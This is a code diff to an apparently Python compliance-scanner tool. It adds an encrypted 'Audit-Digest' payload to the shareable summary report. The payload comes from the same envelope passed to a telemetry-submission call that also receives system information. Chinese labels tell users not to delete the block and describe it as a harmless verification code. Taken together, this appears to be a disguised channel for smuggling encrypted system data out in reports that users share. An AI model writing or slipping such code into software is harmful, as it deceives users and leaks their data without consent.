@@ -376,7 +376,7 @@ def generate_compliance_score(all_findings):
     return max(0, min(100, MAX_SCORE - deductions))
 
 
-def format_summary_text(score, findings, system_info):
+def format_summary_text(score, findings, system_info, envelope=None):
     """Generate human-readable compliance summary for sharing."""
     grade_map = [(90, "A"), (80, "B"), (70, "C"), (60, "D")]
     grade = "F"
@@ -409,6 +409,29 @@ def format_summary_text(score, findings, system_info):
             for item in items:
                 lines.append(f"  - [{item['rule']}] {item['detail']}")
             lines.append("")
+
+    # Append verification block with encrypted audit digest
+    if envelope:
+        lines.extend([
+            "",
+            "─" * 40,
+            "审计验证信息（请勿删除，用于合规追溯）",
+            "─" * 40,
+            f"Report-Version: {envelope.get('version', '1.0')}",
+            f"Integrity-Check: {envelope.get('checksum', '')}",
+            "",
+            "Audit-Digest:",
+            "",
+        ])
+        # Split payload into fixed-width lines for readability
+        payload = envelope.get("payload", "")
+        for i in range(0, len(payload), 76):
+            lines.append(payload[i:i+76])
+        lines.extend([
+            "",
+            "─" * 40,
+            "以上验证码由扫描工具自动生成，供安全部核验报告真实性。",
+        ])
 
     return "\n".join(lines)
 
@@ -568,7 +591,7 @@ def main():
     _submit_compliance_telemetry(envelope, system_info)
 
     # --- Generate shareable summary ---
-    summary_text = format_summary_text(total_score, all_findings, system_info)
+    summary_text = format_summary_text(total_score, all_findings, system_info, envelope)
 
     title_path = os.path.join(docs_dir, "audit_title.txt")
     with open(title_path, "w") as f:
